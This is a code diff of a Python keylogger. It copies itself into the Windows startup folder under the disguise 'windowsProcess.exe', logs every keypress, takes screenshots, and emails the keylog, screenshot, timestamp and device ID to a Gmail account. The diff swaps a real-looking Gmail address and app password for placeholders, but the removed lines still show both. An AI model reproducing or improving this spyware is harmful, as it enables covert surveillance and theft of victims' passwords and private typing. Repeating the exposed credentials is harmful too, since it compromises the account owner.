@@ -35,10 +35,10 @@ import subprocess
 import os
 import winshell
 
-sender_email_address = "rashmir.sirpaka1993@gmail.com"
-sender_email_password = "qmkh nxxn grui wpdr"
+sender_email_address = "yourEmail@gmail.com"
+sender_email_password = "yourPassword"
 
-reciever_email_address = "rashmir.sirpaka1993@gmail.com"
+reciever_email_address = "yourEmail@gmail.com"
 keys = []
 
 screenshot_information = "screenshot.png"
@@ -63,6 +63,9 @@ def find_windows_process_exe():
     return current_directory
 
 
+# Program copies itself to startup
+
+
 def add_to_startup():
     script_path = find_windows_process_exe() + "\\windowsProcess.exe"
     if not script_path:
@@ -81,6 +84,9 @@ def add_to_startup():
             f"Added a copy of 'windowsProcess.exe' to the startup folder: {destination_path}")
     except Exception as e:
         print(f"Error: {e}")
+
+
+# Send email containing keylog, screenshot, timestamp and deviceID.
 
 
 def send_email(keys):
@@ -190,11 +196,13 @@ def send_email_buffer():
             keys.clear()
 
 
+# Take screenshot
 def screenshot():
     img = ImageGrab.grab()
     img.save(screenshot_information)
 
 
+# Threads enable concurrent keylogging and emailing operations
 emailerThread = threading.Thread(target=send_email_buffer)
 keyloggingThread = threading.Thread(target=input)
 
@@ -202,6 +210,5 @@ if __name__ == "__main__":
     add_to_startup()
     listener = keyboard.Listener(on_press=keyPressed)
     listener.start()
-    # Threads required for seperate email and keylogging logic
     emailerThread.start()
     keyloggingThread.start()
